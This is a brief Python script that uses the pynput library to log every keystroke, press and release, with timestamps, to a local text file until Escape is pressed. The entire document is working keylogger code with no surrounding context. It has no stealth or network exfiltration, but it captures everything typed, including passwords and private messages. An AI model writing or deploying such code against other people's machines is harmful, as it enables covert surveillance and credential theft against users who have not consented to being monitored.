from pynput import keyboard
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='["%(asctime)s", %(message)s]')

def on_press(key):
    try:
        logging.info('{0} pressed'.format(
            key.char))
    except AttributeError:
        logging.info('{0} pressed'.format(
            key))

def on_release(key):
    logging.info('{0} released'.format(
        key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
